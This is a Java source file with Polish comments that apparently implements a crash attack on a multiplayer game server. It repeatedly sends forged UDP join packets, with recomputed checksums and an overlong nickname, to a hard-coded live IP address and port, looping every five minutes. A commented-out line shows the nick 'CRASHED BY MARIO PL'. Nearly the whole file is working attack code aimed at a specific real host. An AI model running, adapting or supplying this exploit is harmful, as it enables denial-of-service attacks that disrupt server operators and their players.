package mrconequation;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.util.Arrays;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.bind.DatatypeConverter;

public class MRconEquation {

    static String ip;
    static int port;
    static DatagramSocket socket;

    public static void main(String[] args) {
//        try {

        crash();

    }

    static public void crash() {
        try {
//            ip = args[0];
//            System.out.println(ip);
//            port = Integer.parseInt(args[1]);
//            System.out.println(port);

            ip = "91.188.125.188";
            port = 26001;
            String cmd;
            //pakiet info
            boolean x = true;
            while (x) {
                for (int j = 0; j < 3; j++) {
                    
                    socket = new DatagramSocket();
                    String fakeData = fakeData();
                    //pakiet info
                    byte[] mapinfo = sendPck("deadbeefabababababababab0000000005abababbadeabee");
                    byte map = mapinfo[98];
                    //pierwszy join
                    String join = "deadbeefabababababababab000" + map + "001400ababab0" + map + "00000000000000000000000000000000000000badeabee";
                    byte[] odp = sendPck(join);
                    //pobieramy z odpowiedzi dane potrzebne do kolejnego pakietu
                    int z1 = odp[24] - 1;
                    int z2 = odp[28];
                    //trzeci pakiet
                    cmd = "deadbeef"
                            + "0100000000000000"
                            + "0000"
                            + "0000"
                            + "03ababab"
                            + "01000000ffffffff"
                            + "4c505243"
                            + "00000000"
                            + "00000000"
                            + "00000000000000000000000000000000ffffffff00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            //petla dolacza dlugi nick CRASHED BY MARIO PL
                    //cmd = cmd.concat("2043524153484544204259204d4152494f20504c");
                    String nick = "506f6c736b69204a6f6e6573";
                    cmd = cmd.concat(nick);
                    for (int i = 0; i < 128 - nick.length(); i++) {
                        cmd = cmd.concat("0");
                    }
                    cmd += "6a6f6e6573315f31000a000000000000badeabee";//i koniec pakietu
                    //konwertujemy hex string na byte
                    byte[] pck3 = DatatypeConverter.parseHexBinary(cmd);
                    //wrzucamy dane pobrane z info
                    pck3[32] = (byte) z1;   // w tym wypadku trzeba bylo odjac 1 od wartosci
                    pck3[33] = odp[25];
                    pck3[34] = odp[26];
                    pck3[35] = odp[27];
                    pck3[36] = (byte) z2;   //to chyba id gracza ale tez tak jak bugs odejmujemy 1

                    byte[] crc = checksum(pck3);   //crc
                    pck3[12] = crc[0];
                    pck3[13] = crc[1];
                    byte[] size = sized(pck3);     //rozmiar pakietu
                    pck3[14] = size[0];
                    pck3[15] = size[1];

                    byte[] csp = sendHexPck(pck3);             //wysylamy
                }
                Thread.sleep(5 * 60000);
            }

//            cmd = "deadbeef"
//                    + "01"
//                    + "000000"
//                    + "0e"
//                    + "000000"
//                    + "0d5c"
//                    + "0014"
//                    + "04"
//                    + "ababababababababababababababababababababababab"
//                    + "badeabee";
//
//            byte[] pck4 = DatatypeConverter.parseHexBinary(cmd);
//
//            pck4[36] = (byte) z2;
//            sendHexPck(pck4);
//
//            cmd = "deadbeef"
//                    + "02"
//                    + "000000"
//                    + "0e"
//                    + "000000"
//                    + "0d5c"
//                    + "0014"
//                    + "04"
//                    + "ababababababababababababababababababababababab"
//                    + "badeabee";
//
//            pck4 = DatatypeConverter.parseHexBinary(cmd);
//
//            pck4[36] = (byte) z2;
//            sendHexPck(pck4);
//            cmd = "deadbeef"
//                    + "03"
//                    + "000000"
//                    + "0e"
//                    + "000000"
//                    + "0d5c"
//                    + "0014"
//                    + "04"
//                    + "ababababababababababababababababababababababab"
//                    + "badeabee";
//
//            pck4 = DatatypeConverter.parseHexBinary(cmd);
//
//            pck4[36] = (byte) z2;
//            sendHexPck(pck4);
//            cmd = "deadbeef"
//                    + "0400000000000000"
//                    + "1ec8"
//                    + "0068"
//                    + "03"
//                    + "ababab"
//                    + "04000000ffffffff"
//                    + "5453494c"
//                    + "be6a2c00"
//                    + "04000000"
//                    + "0b"
//                    + "00000004000000"
//                    + "abababab00ababababababababababababababababababab01000000abababababababab"
//                    + "72636f6e2828226173642229290000000000000000000000000000000000000000000000000000000000"
//                    + "badeabee";
//
//          
//            z1 = odp[32] - 2;
//            pck4 = DatatypeConverter.parseHexBinary(cmd);
//    
//            pck4[36] = (byte) z2;
//            pck4[44] = (byte) z2;
//            pck4[20] = (byte) z2;   //to chyba id gracza ale tez tak jak bugs odejmujemy 1
//
//            byte[] crc2 = checksum(pck4);   //crc
//            pck4[12] = crc2[0];
//            pck4[13] = crc2[1];
//            byte[] size2 = sized(pck4);     //rozmiar pakietu
//            pck4[14] = size2[0];
//            pck4[15] = size2[1];
//            byte[] csp2 = sendHexPck(pck4);
//           
            while (true) {
                byte[] buf = new byte[64];
                DatagramPacket packet = new DatagramPacket(buf, buf.length);
                socket.receive(packet);
                String pck = "";
                try {

                    int i = 0;
                    int j = 0;
                    char[] data = new String(packet.getData()).toCharArray();
                    for (byte c : packet.getData()) {

                        if (i == 8) {
                            pck += " ";
                        }
                        pck += String.format("%02x ", c);
                        i++;

                        if (i > 15) {
                            pck += "   ";
                            for (int k = j; k < j + 16; k++) {
                                if (k == j + 8) {
                                    pck += " ";
                                }
                                if ((int) data[k] < 33 || (int) data[k] > 126) {
                                    pck += ".";
                                } else {
                                    pck += data[k];
                                }

                            }
                            j += 16;
                            pck += "\n";
                            i = 0;

                        }

                    }
                } catch (Exception e) {
                    System.out.println(pck);
                    e.printStackTrace();

                }
            }

//           for (byte b : csp) {
//                
//                System.out.format("%.02h", b);
//            }
            //socket.close();
        } catch (Exception e) {
            System.out.println(e);
        }
    }

    static public String sendStrPck(String msg) {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg.getBytes();
            // DatagramSocket socket= new DatagramSocket();
            socket.setSoTimeout(2000);

            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            buf = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);  //odbieramy komende

            message = new String(packet.getData());
            message = message.trim();
            //message = message.substring(22,message.length()-4);

        } catch (Exception ex) {
            System.out.println("pakietasdasda " + ex);
        }
        return message;
    }

    static public byte[] sendPck(String str) {
        byte[] msg = DatatypeConverter.parseHexBinary(str);
        DatagramPacket packet = null;
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg;
            socket.setSoTimeout(2000);

            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            buf = new byte[4096];

            packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);  //odbieramy komende

        } catch (Exception ex) {
            System.out.println("pakietPCK " + ex + str);
        }
        return packet.getData();
    }

    static public byte[] sendHexPck(byte[] msg) {
        DatagramPacket packet = null;
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg;
            socket.setSoTimeout(2000);
            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            byte[] buff = new byte[4096];
            packet = new DatagramPacket(buff, buff.length);
            socket.receive(packet);  //odbieramy komende

        } catch (Exception ex) {
            System.out.println("pakiethex " + ex + new String(msg));
        }
        return packet.getData();
    }

    static byte[] checksum(byte[] pck) {
        int crc = 0;
        for (int i = 20; i < pck.length - 4; i++) {
            //zaczynamy od 20 bo to jest tzn HEADSZ
            int x;
            if (pck[i] == -1) {
                x = 255;
            } else {
                x = pck[i];
            }

            if (x < 0) {
                x += 256;
            }
            crc += x;
            //w bugsie jak liczy crc to jak dochodzi do 65535 to od nowa liczy 
            if (crc > 65536) {
                crc = crc - 65536;
            }
        }
        //robimy tu cos w stylu htons
        int b1 = crc / 256;
        int b2 = crc % 256;
        byte[] ret = new byte[]{(byte) b1, (byte) b2};
        return ret;
    }

    static byte[] sized(byte[] pck) {
        int size = pck.length - 24;
        int b1 = size / 256;
        int b2 = size % 256;
        byte[] ret = new byte[]{(byte) b1, (byte) b2};
        return ret;
    }

    public static String fakeData() {
        String data;
        Random generator = new Random();

        String ip1 = Integer.toString(generator.nextInt(255));
        String ip2 = Integer.toString(generator.nextInt(255));
        String ip3 = Integer.toString(generator.nextInt(255));
        String ip4 = Integer.toString(generator.nextInt(255));
        String port = Integer.toString(generator.nextInt(65535));

        data = ip1 + "." + ip2 + "." + ip3 + "." + ip4 + ":" + port;
        return data;
    }

}
